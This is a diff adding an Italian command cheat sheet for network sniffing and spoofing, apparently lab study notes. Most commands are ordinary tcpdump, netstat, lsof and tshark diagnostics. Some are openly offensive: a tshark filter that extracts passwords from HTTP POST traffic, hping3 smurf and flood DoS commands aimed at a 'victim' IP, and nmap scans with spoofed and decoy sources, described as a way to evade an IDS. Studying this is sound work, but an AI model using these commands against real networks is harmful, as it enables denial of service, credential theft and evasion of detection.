@@ -1,0 +1,146 @@
+SNIFFING - COMANDI
+sudo tcpdump host <indirizzo ip>
+sudo tcpdump host <indirizzo ip> and not <indirizzo ip>
+#Per stampare il traffico né proveniente da né destinato a host locali
+sudo tcpdump 'ip and not net 127.0.0.1'
+#Per stampare i pacchetti di inizio e di fine (i pacchetti SYN e FIN) di ogni conversazione TCP che coinvolge un host non locale.
+sudo tcpdump 'tcp[tcpflags] & (tcp-syn|tcp-fin) != 0 and not src and dst net 127.0.0.1'
+#not ping packet
+sudo tcpdump 'icmp[icmptype] != icmp-echo and icmp[icmptype] != icmp-echoreply'
+
+
+sudo traceroute www.google.it
+#traceroute lavora su UDP, è possibile forzare il tracciamento tramite ICMP utilizzando l'opzione “-I”
+sudo traceroute -I www.google.it
+sudo traceroute -I www.google.it -m 2
+
+
+#Per visualizzare le prese di ascolto e non di ascolto dell’uso della rete
+netstat -a | more
+#Per visualizzare solo le porte TCP
+netstat -at
+#Per viusalizzare solo le porte UDP
+netstat -au
+#Per visualizzare connessioni con porte di ascolto attive
+netstat -l
+#Per visualizzare connessioni TCP con porte di ascolto attive
+netstat -lt
+#Per visualizzare connessioni UDP con porte di ascolto attive
+netstat -lu
+#Per visualizzare connessioni UNIX con porte di ascolto attive
+netstat -lx
+#Per visualizzare le statistiche di tutti i protocolli
+netstat -s
+#Per visualizzare le statistiche del protocollo TCP
+netstat -st
+#Per visualizzare le statistiche del protocollo UDP
+netstat -su
+#Permette di visualizzare anche PID/nome del programma
+netstat -tp
+#Stampa le info net ogni tot secondi
+netstat -c
+#Info sulle tabelle di routing
+netstat -r
+#Info sulle transazioni dell'interfaccia di rete
+netstat -i
+netstat -ie #simile a ifconfig
+netstat -g #interfaccia + appartenenza al gruppo ipv4 o ipv6
+netstat -ap | grep http #visualizzare programmi in ascolto su una porta -> in questo caso con un grep di http
+netstat --statistic --raw #visualizzare statistiche di rete non elaborate
+
+
+lsof
+lsof -i TCP:22 #processi aperti sulla porta 22 con protocollo TCP
+lsof -i TCP
+lsof -i 4 #file di rete IPv4 
+lsof -i 6 #file di rete IPv6
+lsof -i -u^root #abbiamo escluso l'utente root
+lsof -i #listening and established connection
+
+
+#catturare pacchetti in un file pcap e leggerlo
+tshark -i wlp3s0 -w capture-output.pcap
+tshark -r capture-output.pcap
+
+#HTTP Analysis with Tshark
+#-T specifica che vogliamo estrarre campi e -e specifica i campi che vogliamo estrarre, -Y specifica i filtri da applicare
+tshark -i wlp3s0 -Y http.request -T fields -e http.host -e http.user_agent
+
+tshark  -i wlp3s0 -Y http.request -T fields -e http.host -e ip.dst -e http.request.full_uri
+
+#estrarre query DNS
+tshark -i wlp3s0 -f "src port 53" -n -T fields -e dns.qry.name
+
+#estrarre la password da un TCP stream attraverso la HTTP POST
+tshark -i wlan0 -Y 'http.request.method == POST and tcp contains "password"' | grep password
+
+tshark -d tcp.port==8888,http #will decode any traffic running over TCP port 8888 as HTTP.
+
+tshark -d tcp.port==8888:3,http #will decode any traffic running over TCP ports 8888, 8889 or 8890 as HTTP.
+
+tshark -d tcp.port==8888-8890,http #will decode any traffic running over TCP ports 8888, 8889 or 8890 as HTTP.
+
+SNIFFING - FAKE ACCESS POINT
+
+SPOOFING
+
+1.
+#MANDARE PACCHETTI SEMPLICI
+#ping semplice di pacchetti icmp
+sudo hping3 -1 www.google.es 
+
+#ping di pacchetti icmp con traceroute che fa vedere gli hop
+sudo hping3 -1 www.google.es --traceroute
+
+#mandare pacchetti con il flag SYN
+#se si ottiene SA significa SYN/ACK
+#se si ottiene RA significa RST/ACK
+sudo hping3 -S www.google.es -p 80 (-c 1)
+
+#SCAN PORTA
+#ack scan, -V verbose, -s base source port, -A ack flag
+hping3 -c 1 -V -p 80 -s 4060 -A <server>
+
+#Xmas Scan -> viene impostato il numero di sequenza TCP a 0 con -M e vengono attivati i flag URG, PSH e FIN all'interno del pacchetto. Se la porta TCP del destinatario è chiusa viene inviato un pacchetto TCP RST in risposta. Se la porta è aperta, il destinatario scarta il pacchetto TCP Xmas e non invia alcuna risposta.  
+hping3 -c 1 -V -p 80 -s 4060 -M 0 -UPF <_server_>
+
+#null scan viene impostato il numero sequenziale a 0 e nessun flag è attivo all'interno del pacchetto. Il pacchetto inviato prende il nome di TCP NULL. Se la porta TCP del destinatario è chiusa si riceve in risposta il pacchetto TCP RST. Se la porta è aperta il pacchetto TCP NULL viene scartato e non viene inviata alcuna risposta.  
+hping3 -c 1 -V -p 80 -s 4060 -Y <server> 
+
+#smurf attack -> spoofed broadcast: -a spoofed ip
+hping3 -1 --flood -a <IP SOURCE> <IP_VITTIMA INDIRIZZO_BROADCAST>
+
+#dos land attack -> spoofed source: -w tcp window size, -d data size
+hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source <IP_VITTIMA>
+
+
+2.
+#DAL PC
+#scanner per vedere le porte aperte
+nmap -sS -T4 <ip dst raspberry>
+
+#vedere quali device sono connessi alla tua stessa rete
+sudo nmap -sn <tuo ip>/24
+
+#1. spoofing dal raspberry pi
+#sS: SYN scan è l'opzione di default ed è la più usata per buone ragioni. Può essere effettuato velocemente: effettua la scansione su migliaia di porte al secondo su una rete veloce non limitata da firewall restrittivi. Il SYN scan è relativamente nascosto e poco invasivo, poiché non completa mai le connessioni TCP.
+sudo nmap -sS -T4 <ip spoofed> -e wlan0 -S <ip dst>
+sudo nmap -e wlan0 -S <ip spoofed> <ip dst>
+
+#2. spoofing random addresses
+#Quest'opzione invoca una "decoy scan" (ovvero una scansione utilizzando esche) che agli occhi dell'host di destinazione apparirà come se provenisse dagli host specificati come decoy. In questo modo l'IDS della rete bersaglio mostrerà 5-10 port scan provenienti da indirizzi IP singoli, e non potrà capire quale IP è veramente la sorgente dell'attacco e quale IP è usato solo come mascheramento. Nonostante quest'opzione possa essere resa inutile mediante il tracciamento del percorso fatto dai router ("router path tracing"), tecniche di response-dropping e altri meccanismi attivi sono generalmente una tecnica effettiva per nascondere il proprio indirizzo IP.
+sudo nmap -D RND:<numero addr> <ip dst raspberry>
+
+
+3.
+# Send a single TCP segment with SYN bit set  
+sudo hping3 -c 1 -I wlp3s0 -p 443 -S <ip non del pc> 
+# Capture single packet, write to disk  
+sudo netsniff-ng --in wlp3s0 --out tcpsyn.pcap  
+# Convert pcap to trafgen config  
+sudo netsniff-ng --in tcpsyn.pcap --out tcpsyn.cfg  
+# Send packet x 1000  
+sudo trafgen --in tcpsyn.cfg --out wlp3s0 --num 1000
+
+#generare traffico definito nel file di configurazione e mandarlo via interfaccia indicata
+trafgen --dev wlp3s0 --conf trafgen.cfg
